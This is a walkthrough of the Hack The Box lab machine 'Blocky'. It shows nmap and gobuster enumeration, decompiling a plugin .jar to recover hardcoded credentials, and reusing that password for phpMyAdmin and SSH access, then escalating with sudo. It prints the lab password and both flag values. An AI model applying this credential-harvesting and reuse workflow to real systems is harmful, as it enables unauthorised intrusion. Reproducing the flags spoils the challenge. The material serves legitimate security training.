# References
1. [Blocky Writeup (medium.com)](https://medium.com/@fularam.prajapati/hack-the-box-blocky-walkthrough-writeup-oscp-63cd229e7ff3)

# Summary
### 1. NMAP
Running NMAP, we see 3 ports opened, HTTP, FTP & SSH. Doing searchsploit for HTTP & SSH versions didn't show anything obvious we could use. NMAP's vuln script revealed a username `notch`.

### 2. Enumeration on Port 80 HTTP
On Port 80 HTTP, we see a site BlockyCraft which is still in development. We run GoBuster, which revealed 8 directories.

### 3. Decompile .jar Files
After going through things we saw from NMAP vuln script and the majority of the files in the directories we saw from GoBuster, it did not yield anything useful. The exception being `http://10.129.1.53/plugins/`, where there were 2 `.jar` files.

We used JD-Gui, a Java decompiler to decompile the files. In the `.jarBlockyCore.jar` file, we see credentials where "root" is the username and "8YsqfCTnvxAUeduzjNSXe22" is the password.

### 4. Credential Reuse
With these credentials, we were able to log into `http://10.129.1.53/phpmyadmin/`, but did not try anything further as we tried to use the same set of credentials for SSH for direct access.

Trying to SSH with username "root" did not work, but SSH with username "notch" worked. We got into the system.

### 5. Getting Flags
Getting user flag was relatively easy. Getting system flag was relatively easy, as doing `id` command revealed that `notch` user is a sudo-er. Running `sudo -i` command and supplying it with the password we found gave us root access, and subsequently the root flag.

# Attack
## 1. NMAP
Same old. 
```
hippoeug@kali:~$ nmap -sC -sV 10.129.1.53 -Pn -v
Starting Nmap 7.80 ( https://nmap.org ) at 2021-02-06 14:23 +08
...
PORT     STATE  SERVICE VERSION
21/tcp   open   ftp?
22/tcp   open   ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 d6:2b:99:b4:d5:e7:53:ce:2b:fc:b5:d7:9d:79:fb:a2 (RSA)
|   256 5d:7f:38:95:70:c9:be:ac:67:a0:1e:86:e7:97:84:03 (ECDSA)
|_  256 09:d5:c2:04:95:1a:90:ef:87:56:25:97:df:83:70:67 (ED25519)
80/tcp   open   http    Apache httpd 2.4.18 ((Ubuntu))
|_http-generator: WordPress 4.8
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: BlockyCraft &#8211; Under Construction!
8192/tcp closed sophos
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
...
```
Interesting, 3 opened ports. We will enumerate Port 80 first. But good to know that there is FTP & SSH we could potentially attack from as well.

Since we're here and already know the versions of the applications running, we might as well do a searchsploit.
```
hippoeug@kali:~$ searchsploit wordpress 4.8
------------------------------------------------------------------------------------------------------------------------------------ ---------------------------------
 Exploit Title                                                                                                                      |  Path
------------------------------------------------------------------------------------------------------------------------------------ ---------------------------------
WordPress Core < 4.9.6 - (Authenticated) Arbitrary File Deletion                                                                    | php/webapps/44949.txt
WordPress Core < 5.2.3 - Viewing Unauthenticated/Password/Private Posts                                                             | multiple/webapps/47690.md
WordPress Core < 5.3.x - 'xmlrpc.php' Denial of Service                                                                             | php/dos/47800.py
WordPress Plugin Better WP Security 3.4.8/3.4.9/3.4.10/3.5.2/3.5.3 - Persistent Cross-Site Scripting                                | php/webapps/27290.txt
WordPress Plugin Database Backup < 5.2 - Remote Code Execution (Metasploit)                                                         | php/remote/47187.rb
WordPress Plugin DZS Videogallery < 8.60 - Multiple Vulnerabilities                                                                 | php/webapps/39553.txt
WordPress Plugin EZ SQL Reports < 4.11.37 - Multiple Vulnerabilities                                                                | php/webapps/38176.txt
WordPress Plugin iThemes Security < 7.0.3 - SQL Injection                                                                           | php/webapps/44943.txt
WordPress Plugin oQey Gallery 0.4.8 - SQL Injection                                                                                 | php/webapps/17779.txt
WordPress Plugin Participants Database 1.5.4.8 - SQL Injection                                                                      | php/webapps/33613.txt
WordPress Plugin User Role Editor < 4.25 - Privilege Escalation                                                                     | php/webapps/44595.rb
WordPress Plugin Userpro < 4.9.17.1 - Authentication Bypass                                                                         | php/webapps/43117.txt
WordPress Plugin UserPro < 4.9.21 - User Registration Privilege Escalation                                                          | php/webapps/46083.txt
WordPress Plugin WP Fastest Cache 0.8.4.8 - Blind SQL Injection                                                                     | php/webapps/38678.txt
------------------------------------------------------------------------------------------------------------------------------------ ---------------------------------
Shellcodes: No Results

hippoeug@kali:~$ searchsploit apache 2.4.18
------------------------------------------------------------------------------------------------------------------------------------ ---------------------------------
 Exploit Title                                                                                                                      |  Path
------------------------------------------------------------------------------------------------------------------------------------ ---------------------------------
Apache + PHP < 5.3.12 / < 5.4.2 - cgi-bin Remote Code Execution                                                                     | php/remote/29290.c
Apache + PHP < 5.3.12 / < 5.4.2 - Remote Code Execution + Scanner                                                                   | php/remote/29316.py
Apache 2.4.17 < 2.4.38 - 'apache2ctl graceful' 'logrotate' Local Privilege Escalation                                               | linux/local/46676.php
Apache < 2.2.34 / < 2.4.27 - OPTIONS Memory Leak                                                                                    | linux/webapps/42745.py
Apache CXF < 2.5.10/2.6.7/2.7.4 - Denial of Service                                                                                 | multiple/dos/26710.txt
Apache mod_ssl < 2.8.7 OpenSSL - 'OpenFuck.c' Remote Buffer Overflow                                                                | unix/remote/21671.c
Apache mod_ssl < 2.8.7 OpenSSL - 'OpenFuckV2.c' Remote Buffer Overflow (1)                                                          | unix/remote/764.c
Apache mod_ssl < 2.8.7 OpenSSL - 'OpenFuckV2.c' Remote Buffer Overflow (2)                                                          | unix/remote/47080.c
Apache OpenMeetings 1.9.x < 3.1.0 - '.ZIP' File Directory Traversal                                                                 | linux/webapps/39642.txt
Apache Tomcat < 5.5.17 - Remote Directory Listing                                                                                   | multiple/remote/2061.txt
Apache Tomcat < 6.0.18 - 'utf8' Directory Traversal                                                                                 | unix/remote/14489.c
Apache Tomcat < 6.0.18 - 'utf8' Directory Traversal (PoC)                                                                           | multiple/remote/6229.txt
Apache Tomcat < 9.0.1 (Beta) / < 8.5.23 / < 8.0.47 / < 7.0.8 - JSP Upload Bypass / Remote Code Execution (1)                        | windows/webapps/42953.txt
Apache Tomcat < 9.0.1 (Beta) / < 8.5.23 / < 8.0.47 / < 7.0.8 - JSP Upload Bypass / Remote Code Execution (2)                        | jsp/webapps/42966.py
Apache Xerces-C XML Parser < 3.1.2 - Denial of Service (PoC)                                                                        | linux/dos/36906.txt
Webfroot Shoutbox < 2.32 (Apache) - Local File Inclusion / Remote Code Execution                                                    | linux/remote/34.pl
------------------------------------------------------------------------------------------------------------------------------------ ---------------------------------
Shellcodes: No Results
```
Nothing interesting at the moment we can use, so let's KIV and only find an exploit to use later should we need it.

Now for the other script which took longer than usual to run, hence we just ran it full force without a care for OpSec.
```
hippoeug@kali:~$ nmap --script vuln 10.129.1.53 -Pn -v -T insane
Starting Nmap 7.80 ( https://nmap.org ) at 2021-02-06 14:57 +08
...
PORT     STATE  SERVICE
21/tcp   open   ftp
|_clamav-exec: ERROR: Script execution failed (use -d to debug)
|_sslv2-drown: 
22/tcp   open   ssh
|_clamav-exec: ERROR: Script execution failed (use -d to debug)
80/tcp   open   http
|_clamav-exec: ERROR: Script execution failed (use -d to debug)
| http-csrf: 
| Spidering limited to: maxdepth=3; maxpagecount=20; withinhost=10.129.1.53
|   Found the following possible CSRF vulnerabilities: 
|     
|     Path: http://10.129.1.53:80/
|     Form id: search-form-601e3e3ad6f2f
|     Form action: http://10.129.1.53/
|     
|     Path: http://10.129.1.53:80/index.php/category/uncategorized/
|     Form id: search-form-601e3e4006cef
|     Form action: http://10.129.1.53/
|     
|     Path: http://10.129.1.53:80/index.php/2017/07/
|     Form id: search-form-601e3e446d043
|     Form action: http://10.129.1.53/
|     
|     Path: http://10.129.1.53:80/wp-login.php
|     Form id: loginform
|     Form action: http://10.129.1.53/wp-login.php
|     
|     Path: http://10.129.1.53:80/index.php/category/uncategorized/%5c%22
|     Form id: search-form-601e3e4adde55
|     Form action: http://10.129.1.53/
|     
|     Path: http://10.129.1.53:80/index.php/2017/07/%5c%22
|     Form id: search-form-601e3e4d1be6d
|     Form action: http://10.129.1.53/
|     
|     Path: http://10.129.1.53:80/wp-login.php?action=lostpassword
|     Form id: lostpasswordform
|_    Form action: http://10.129.1.53/wp-login.php?action=lostpassword
|_http-dombased-xss: Couldn't find any DOM based XSS.
| http-enum: 
|   /wiki/: Wiki
|   /wp-login.php: Possible admin folder
|   /phpmyadmin/: phpMyAdmin
|   /readme.html: Wordpress version: 2 
|   /: WordPress version: 4.8
|   /wp-includes/images/rss.png: Wordpress version 2.2 found.
|   /wp-includes/js/jquery/suggest.js: Wordpress version 2.5 found.
|   /wp-includes/images/blank.gif: Wordpress version 2.6 found.
|   /wp-includes/js/comment-reply.js: Wordpress version 2.7 found.
|   /wp-login.php: Wordpress login page.
|   /wp-admin/upgrade.php: Wordpress login page.
|_  /readme.html: Interesting, a readme.
| http-slowloris-check: 
|   VULNERABLE:
|   Slowloris DOS attack
|     State: LIKELY VULNERABLE
|     IDs:  CVE:CVE-2007-6750
|       Slowloris tries to keep many connections to the target web server open and hold
|       them open as long as possible.  It accomplishes this by opening connections to
|       the target web server and sending a partial request. By doing so, it starves
|       the http server's resources causing Denial Of Service.
|       
|     Disclosure date: 2009-09-17
|     References:
|       http://ha.ckers.org/slowloris/
|_      https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2007-6750
| http-sql-injection: 
|   Possible sqli for queries:
|     http://10.129.1.53:80/wp-includes/js/jquery/?C=S%3bO%3dA%27%20OR%20sqlspider
|     http://10.129.1.53:80/wp-includes/js/jquery/?C=M%3bO%3dA%27%20OR%20sqlspider
|     http://10.129.1.53:80/wp-includes/js/jquery/?C=D%3bO%3dA%27%20OR%20sqlspider
|_    http://10.129.1.53:80/wp-includes/js/jquery/?C=N%3bO%3dD%27%20OR%20sqlspider
|_http-stored-xss: Couldn't find any stored XSS vulnerabilities.
| http-wordpress-users: 
| Username found: notch
|_Search stopped at ID #25. Increase the upper limit if necessary with 'http-wordpress-users.limit'
8192/tcp closed sophos
...
```
Now now, although this took longer than usual to run, it was very worth it. Let's see what information we got from Port 80 HTTP.

Couple of potential login pages, maybe SQL Injection, and finally also a username `notch`. Very interestsing.

## 2. Enumeration on Port 80 HTTP
Enumerating on `http://10.129.1.53`, we are presented with a BLOCKYCRAFT page which is apparently under construction.

![Site1](https://user-images.githubusercontent.com/21957042/113508387-56d4b600-9582-11eb-9fee-0fce77a1c0da.png)
![Site2](https://user-images.githubusercontent.com/21957042/113508388-5805e300-9582-11eb-9ae1-085c503fe13e.png)

Okay, nothing interesting so far. Looking at the source page, we don't find anything interesting as well.

Let's run a GoBuster!
```
hippoeug@kali:~$ gobuster dir -u "http://10.129.1.53:80" -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 100
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://10.129.1.53:80
[+] Threads:        100
[+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Timeout:        10s
===============================================================
2021/02/06 14:34:43 Starting gobuster
===============================================================
/wiki (Status: 301)
/wp-content (Status: 301)
/plugins (Status: 301)
/wp-includes (Status: 301)
/javascript (Status: 301)
/wp-admin (Status: 301)
/phpmyadmin (Status: 301)
/server-status (Status: 403)
===============================================================
2021/02/06 14:44:15 Finished
===============================================================
```
Cool, couple of directories.

Let's enumerate them and list them out!

`http://10.129.1.53/wiki/`
![Wiki](https://user-images.githubusercontent.com/21957042/113508392-59cfa680-9582-11eb-99f2-d937f950fbd6.png)

`http://10.129.1.53/wp-content/`
![wp-content](https://user-images.githubusercontent.com/21957042/113508395-5a683d00-9582-11eb-82ce-cad6ab574257.png)

`http://10.129.1.53/wp-content/uploads/`
![uploads](https://user-images.githubusercontent.com/21957042/113508391-59371000-9582-11eb-9421-0df45b2f429c.png)

`http://10.129.1.53/plugins/`
![Plugins](https://user-images.githubusercontent.com/21957042/113508382-55a38900-9582-11eb-96b4-d27ec1001d79.png)

`http://10.129.1.53/wp-includes/`
![wp-includes](https://user-images.githubusercontent.com/21957042/113508396-5b00d380-9582-11eb-933d-b877e7246aef.png)
```
-> Index of /wp-includes
[ICO]	Name	Last modified	Size	Description
[PARENTDIR]	Parent Directory	 	- 	 
[DIR]	ID3/	2017-06-08 14:29 	- 	 
[DIR]	IXR/	2017-06-08 14:29 	- 	 
[DIR]	Requests/	2017-06-08 14:29 	- 	 
[DIR]	SimplePie/	2017-06-08 14:29 	- 	 
[DIR]	Text/	2017-06-08 14:29 	- 	 
[ ]	admin-bar.php	2017-05-12 20:06 	27K	 
[ ]	atomlib.php	2016-12-13 01:49 	12K	 
[ ]	author-template.php	2017-03-25 15:47 	15K	 
[ ]	bookmark-template.php	2016-05-22 18:24 	11K	 
[ ]	bookmark.php	2016-12-14 04:18 	13K	 
[ ]	cache.php	2016-10-31 06:28 	22K	 
[ ]	canonical.php	2017-05-12 22:50 	26K	 
[ ]	capabilities.php	2017-05-11 19:24 	23K	 
[ ]	category-template.php	2017-05-22 20:24 	51K	 
[ ]	category.php	2017-01-29 11:50 	12K	 
[DIR]	certificates/	2017-06-08 14:29 	- 	 
[ ]	class-IXR.php	2016-08-31 16:31 	2.5K	 
[ ]	class-feed.php	2016-12-03 03:30 	522 	 
[ ]	class-http.php	2017-05-16 08:38 	36K	 
[ ]	class-json.php	2015-12-06 21:23 	40K	 
[ ]	class-oembed.php	2017-05-11 18:18 	29K	 
[ ]	class-phpass.php	2015-10-06 23:45 	7.1K	 
...
[ ]	taxonomy.php	2017-04-21 19:14 	142K	 
[ ]	template-loader.php	2016-10-07 21:03 	2.8K	 
[ ]	template.php	2017-02-12 21:25 	19K	 
[DIR]	theme-compat/	2017-06-08 14:29 	- 	 
[ ]	theme.php	2017-05-16 05:37 	96K	 
[ ]	update.php	2017-05-06 14:30 	23K	 
[ ]	user.php	2017-04-30 13:03 	84K	 
[ ]	vars.php	2016-12-27 09:21 	5.2K	 
[ ]	version.php	2017-06-08 14:27 	617 	 
[ ]	widgets.php	2017-05-19 20:45 	47K	 
[DIR]	widgets/	2017-06-08 14:29 	- 	 
[ ]	wlwmanifest.xml	2013-12-11 19:49 	1.0K	 
[ ]	wp-db.php	2016-11-21 01:22 	93K	 
[ ]	wp-diff.php	2016-08-31 16:31 	661 	 
Apache/2.4.18 (Ubuntu) Server at 10.129.1.53 Port 80
```
```

`http://10.129.1.53/javascript/`
![javascript](https://user-images.githubusercontent.com/21957042/113508378-53d9c580-9582-11eb-9b70-8e4efb4a7e41.png)

`http://10.129.1.53/wp-admin/` is redirected to `http://10.129.1.53/wp-login.php?redirect_to=http%3A%2F%2F10.129.1.53%2Fwp-admin%2F&reauth=1`
![wp-admin](https://user-images.githubusercontent.com/21957042/113508394-59cfa680-9582-11eb-8a65-a0931c6cd6f3.png)

`http://10.129.1.53/phpmyadmin/`
![phpmyadmin](https://user-images.githubusercontent.com/21957042/113508381-550af280-9582-11eb-97fc-dc808d7fac35.png)

`http://10.129.1.53/server-status`
![server_status](https://user-images.githubusercontent.com/21957042/113508385-563c1f80-9582-11eb-993b-b161a7d93a3e.png)

That is quite a lot of things to go through. 

## 3. Decompile .jar Files
As we've seen in the previous machine [Bank](https://github.com/HippoEug/HackTheBox/blob/main/Machines%20(Easy)/Bank.md), it's not all about exploits sometimes. Bad configuration and practices can lead us into a machine.

After going through the things from `nmap --script vuln`, we got nothing.

The files and directories that surfaced in GoBuster did not show any interesting config files as well, except 2.

![Plugins](https://user-images.githubusercontent.com/21957042/113508382-55a38900-9582-11eb-96b4-d27ec1001d79.png)

I know from my short Cyber Security course that .NET is relatively easy to decompile and reverse engineer, and IIRC same with Java. Let's reverse engineer these files.

Looking for a Java Decompiler, we come across one that looks decent, JD-Gui. Let's install that.
```
hippoeug@kali:~/Downloads$ sudo dpkg -i jd-gui-1.6.6.deb
[sudo] password for hippoeug: 
Selecting previously unselected package jd-gui.
(Reading database ... 311041 files and directories currently installed.)
Preparing to unpack jd-gui-1.6.6.deb ...
Unpacking jd-gui (1.6.6-0) ...
Setting up jd-gui (1.6.6-0) ...
hippoeug@kali:~/Downloads$ 
```

Upon opening the `.jarBlockyCore.jar` file, we see a file, `BlockyCore.class`. Let's see what's inside that file.

![Decompiled](https://user-images.githubusercontent.com/21957042/113508377-52a89880-9582-11eb-8279-5a8abfd61332.png)

Interesting, a username and password! Now this reminds me of two exercises we did previously, [Beep](https://github.com/HippoEug/HackTheBox/blob/main/Machines%20(Easy)/Beep.md) & [Bank](https://github.com/HippoEug/HackTheBox/blob/main/Machines%20(Easy)/Bank.md) where we utilized the reuse of credentials found.

## 4. Credential Reuse
Now that we know that a username is `root` & password is `8YsqfCTnvxAUeduzjNSXe22`, we can start using these to log onto the different sites.

Let's try `http://10.129.1.53/phpmyadmin/` first. I was able to successfully log into this phpMyAdmin page! Potentially, if I need to upload a reverse shell, I could attempt to do it from here.

![LOGGEDIN](https://user-images.githubusercontent.com/21957042/113508380-54725c00-9582-11eb-8c12-792e8c03243d.png)

Followed by `http://10.129.1.53/wp-admin/`. Attempt to use these credentials were unsucessful, as we got a `ERROR: Invalid username. Lost your password?` error.

![UnableLOGIN](https://user-images.githubusercontent.com/21957042/113508389-589e7980-9582-11eb-910a-fe6028dc28ed.png)

Since we also saw the existence of Port 21 SSH, we try to login with the credentials.
```
hippoeug@kali:~$ ssh root@10.129.1.53
The authenticity of host '10.129.1.53 (10.129.1.53)' can't be established.
ECDSA key fingerprint is SHA256:lg0igJ5ScjVO6jNwCH/OmEjdeO2+fx+MQhV/ne2i900.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.129.1.53' (ECDSA) to the list of known hosts.
root@10.129.1.53's password: 
Permission denied, please try again.
root@10.129.1.53's password: 
```
This didn't work. Since we saw a username `notch` earlier, let's try that.
```
hippoeug@kali:~$ ssh notch@10.129.1.53
notch@10.129.1.53's password: 
Welcome to Ubuntu 16.04.2 LTS (GNU/Linux 4.4.0-62-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

7 packages can be updated.
7 updates are security updates.


Last login: Thu Sep 24 08:12:11 2020 from 10.10.14.2
notch@Blocky:~$
```
This worked!

## 5. Getting Flags
Time to find flags.
```
otch@Blocky:~$ dir
minecraft  user.txt
notch@Blocky:~$ cat user.txt
59fee0977fb60b8a0bc6e41e751f3cd5
```
Cool, one down.

Let's find the root flag.
```
notch@Blocky:/$ dir
bin  boot  dev  etc  home  initrd.img  lib  lib64  lost+found  media  mnt  opt  proc  root  run  sbin  snap  srv  sys  tmp  usr  var  vmlinuz  works
notch@Blocky:/$ cd root
-bash: cd: root: Permission denied
notch@Blocky:/$ 
```
We do not have root privileges. Searching online, we come across a tip to enumerate.
```
notch@Blocky:/$ id
uid=1000(notch) gid=1000(notch) groups=1000(notch),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),110(lxd),115(lpadmin),116(sambashare)    
```
This shows that notch user is a sudo-er!

To login, we just have to use `-i`! To enumerate a user privileges, we could use `-l`.
```
notch@Blocky:/$ sudo -i
[sudo] password for notch: 
root@Blocky:~# dir
dhcp.sh  root.txt
root@Blocky:~# cat root.txt
0a9694a5b4d272c694679f7860f1cd5f
```
Got it!
